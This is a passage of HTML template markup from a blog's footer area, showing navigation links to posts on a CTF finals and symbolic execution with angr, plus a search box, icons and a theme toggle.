        <span>
          
            <a class="flex group" href="/posts/2021-11-09_africahackon-2021-ctf-finals/">
              <span
                class="mr-3 ltr:inline rtl:hidden text-neutral-700 dark:text-neutral group-hover:text-primary-600 dark:group-hover:text-primary-400"
                >&larr;</span
              >
              <span
                class="ml-3 ltr:hidden rtl:inline text-neutral-700 dark:text-neutral group-hover:text-primary-600 dark:group-hover:text-primary-400"
                >&rarr;</span
              >
              <span class="flex flex-col">
                <span
                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
                  >AfricaHackon 2021 CTF Finals</span
                >
                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                  
                    <time datetime="2021-11-09 11:58:56.446 &#43;0000 UTC">9 November 2021</time>
                  
                </span>
              </span>
            </a>
          
        </span>
        <span>
          
            <a class="flex text-right group" href="/posts/symbolic_execution_angr_part1/">
              <span class="flex flex-col">
                <span
                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
                  >Symbolic Execution with Angr - part 1</span
                >
                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                  
                    <time datetime="2022-08-15 00:00:00 &#43;0000 UTC">15 August 2022</time>
                  
                </span>
              </span>
              <span
                class="ml-3 ltr:inline rtl:hidden text-neutral-700 dark:text-neutral group-hover:text-primary-600 dark:group-hover:text-primary-400"
                >&rarr;</span
              >
              <span
                class="mr-3 ltr:hidden rtl:inline text-neutral-700 dark:text-neutral group-hover:text-primary-600 dark:group-hover:text-primary-400"
                >&larr;</span
              >
            </a>
          
        </span>
      </div>
    </div>
  


    </footer>
    
  </article>

        
          <div
            class="absolute top-[110vh] ltr:right-0 rtl:left-0 w-12 pointer-events-none bottom-0"
          >
            <a
              href="#the-top"
              class="w-12 h-12 sticky pointer-events-auto top-[calc(100vh-5.5rem)] bg-neutral/50 dark:bg-neutral-800/50 backdrop-blur rounded-full text-xl flex items-center justify-center text-neutral-700 dark:text-neutral hover:text-primary-600 dark:hover:text-primary-400"
              aria-label="Scroll to top"
              title="Scroll to top"
            >
              &uarr;
            </a>
          </div>
        
      </main>
      <div
  id="search-wrapper"
  class="fixed inset-0 z-50 flex flex-col p-4 sm:p-6 md:p-[10vh] lg:p-[12vh] w-screen h-screen cursor-default bg-neutral-500/50 backdrop-blur-sm dark:bg-neutral-900/50 invisible"
  data-url="https://trevorsaudi.com/"
>
  <div
    id="search-modal"
    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg border-neutral-200 top-20 bg-neutral dark:bg-neutral-800 dark:border-neutral-700"
  >
    <header class="relative z-10 flex items-center justify-between flex-none px-2">
      <form class="flex items-center flex-auto min-w-0">
        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
          

  <span class="relative inline-block align-text-bottom icon">
    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>

  </span>


        </div>
        <input
          type="search"
          id="search-query"
          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-transparent focus:outline-2"
          placeholder="Search"
          tabindex="0"
        />
      </form>
      <button
        id="close-search-button"
        class="flex items-center justify-center w-8 h-8 text-neutral-700 dark:text-neutral hover:text-primary-600 dark:hover:text-primary-400"
        title="Close (Esc)"
      >
        

  <span class="relative inline-block align-text-bottom icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>

  </span>


      </button>
    </header>
    <section class="flex-auto px-2 overflow-auto">
      <ul id="search-results">
        
      </ul>
    </section>
  </div>
</div>
<footer class="py-10 print:hidden">
  
  
  <div class="flex justify-between">
    <div>
      
      <p class="text-sm text-neutral-500 dark:text-neutral-400">
          ðŸ˜„
      </p>
      
      
        <p class="text-xs text-neutral-500 dark:text-neutral-400">
          
          
          Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
            href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href="https://git.io/hugo-congo" target="_blank" rel="noopener noreferrer">Congo</a>
        </p>
      
    </div>
    
    
      <div
        class="text-sm cursor-pointer text-neutral-700 dark:text-neutral hover:text-primary-600 dark:hover:text-primary-400 ltr:mr-14 rtl:ml-14"
      >
        <button
          id="appearance-switcher"
          class="w-12 h-12 "
          type="button"
          title="Switch to dark appearance"
        >
          <span class="inline dark:hidden">

  <span class="relative inline-block align-text-bottom icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>

  </span>

</span>
          <span class="hidden dark:inline">

  <span class="relative inline-block align-text-bottom icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>

  </span>

</span>
        </button>
      </div>
    
  </div>
  
  
</footer>
</div>
  </body>
</html>
